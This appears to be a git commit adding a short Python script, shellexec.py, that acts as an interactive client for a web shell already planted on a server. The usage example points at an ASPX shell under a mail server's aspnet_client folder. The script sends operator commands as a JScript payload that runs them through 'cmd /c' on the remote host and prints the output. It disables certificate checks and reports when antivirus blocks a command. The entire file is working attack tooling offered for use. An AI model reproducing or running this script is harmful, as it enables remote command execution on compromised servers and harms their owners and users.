d4641f429671080a5766b8c20e06ccf25a255176
lulz <39673284+Udyz@users.noreply.github.com>
2021-03-21 12:37:38 +0700

    Create shellexec.py

---
+++ shellexec.py
@@ -0,0 +1,23 @@
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+import sys
+if len(sys.argv) < 3:
+	print('\r\n--------------------\n+ Author: github.com/Udyz\n+ twitter.com/lotusdll\n--------------------\n[*] USAGE: ./{file} <shell url> <password>\nex: ./{file} https://mail.local/aspnet_client/shell.aspx exec_code'.format(file=sys.argv[0]))
+	exit()
+url = sys.argv[1]
+code = sys.argv[2]
+try:
+	while True:
+		cmd = input('CMD: ')
+		shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'%(code, cmd)
+		shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=10)
+		if shell_req.status_code == 200:
+			print(shell_req.text.split('Name                            :')[0])
+		else:
+			print('(-) AV block exec cmd!!')
+except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
+	exit(0)
+except KeyboardInterrupt:
+	exit(0)
